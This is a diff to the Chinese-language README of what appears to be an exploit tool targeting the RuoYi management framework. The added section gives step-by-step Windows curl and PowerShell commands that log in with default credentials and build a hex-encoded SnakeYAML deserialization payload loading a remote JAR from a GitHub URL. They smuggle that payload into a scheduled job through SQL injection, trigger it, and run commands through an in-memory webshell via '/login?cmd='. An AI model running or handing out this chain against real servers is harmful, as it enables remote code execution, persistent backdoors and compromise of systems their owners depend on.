@@ -35,7 +35,45 @@ java -jar ruoyi-gzms.jar --url http://target:8080 --cookie "JSESSIONID=..."
 #   --no-cleanup    保留临时任务和被改写的 job1
 ```
 
-要求 JRE 8+，无其他依赖。
+要求 JRE 8+，无其他依赖。Windows 同样：`java -jar ruoyi-gzms.jar --url ... --user ... --pass ...`。
+
+## Windows curl 快速验证
+
+cmd 里最快验证内存马（匿名路径，无需登录）：
+
+```bat
+curl.exe -s "http://target:8080/login?cmd=whoami"
+curl.exe -s "http://target:8080/login?cmd=ipconfig"
+```
+
+cmd 取 cookie / 打点：
+
+```bat
+curl.exe -s -c cookies.txt -d "username=admin&password=admin123&rememberMe=false" http://target:8080/login
+curl.exe -s -b cookies.txt -X POST "http://target:8080/monitor/job/list?pageNum=1&pageSize=10"
+```
+
+完整三阶段链（**PowerShell** 里跑——payload 含单双引号，cmd 传参会截断，PowerShell 才能正确传给 curl.exe）：
+
+```powershell
+# 0) 登录取 cookie
+curl.exe -s -c cookies.txt -d "username=admin&password=admin123&rememberMe=false" http://target:8080/login
+
+# 1) 生成 hex payload（hex 后只剩 0-9a-f，一次绕过 6 道控制器校验）
+$p = 'org.yaml.snakeyaml.Yaml.load(''!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["https://raw.githubusercontent.com/tiaodan577-glitch/ry-gz-payload/main/g.jar"]]]]'')'
+$hex = '0x' + (([Text.Encoding]::UTF8.GetBytes($p) | ForEach-Object { '{0:x2}' -f $_ }) -join '')
+$inv = "genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = $hex WHERE job_id = 1')"
+
+# 2) Stage1：建任务（invokeTarget 超 varchar(500) 会截断，URL 要短）
+curl.exe -s -b cookies.txt -X POST http://target:8080/monitor/job/add --data-urlencode "jobName=gzms1" --data-urlencode "jobGroup=DEFAULT" --data-urlencode "invokeTarget=$inv" --data-urlencode "cronExpression=0 0 0 1 1 ?" --data-urlencode "misfirePolicy=0" --data-urlencode "concurrent=1" --data-urlencode "status=1"
+
+# 3) 从 job/list 返回里拿 gzms1 的 jobId，然后：
+curl.exe -s -b cookies.txt -X POST http://target:8080/monitor/job/run -d "jobId=<临时任务ID>"   # Stage2 篡改 job1
+curl.exe -s -b cookies.txt -X POST http://target:8080/monitor/job/run -d "jobId=1"              # Stage3 触发
+curl.exe -s "http://target:8080/login?cmd=whoami"                                               # 验证回显
+```
+
+注意：开验证码的目标先跑 `--cookie` 模式（浏览器登录后贴 JSESSIONID），或等 CLI 的验证码 OCR 支持。
 
 ## gzcli 连接
 
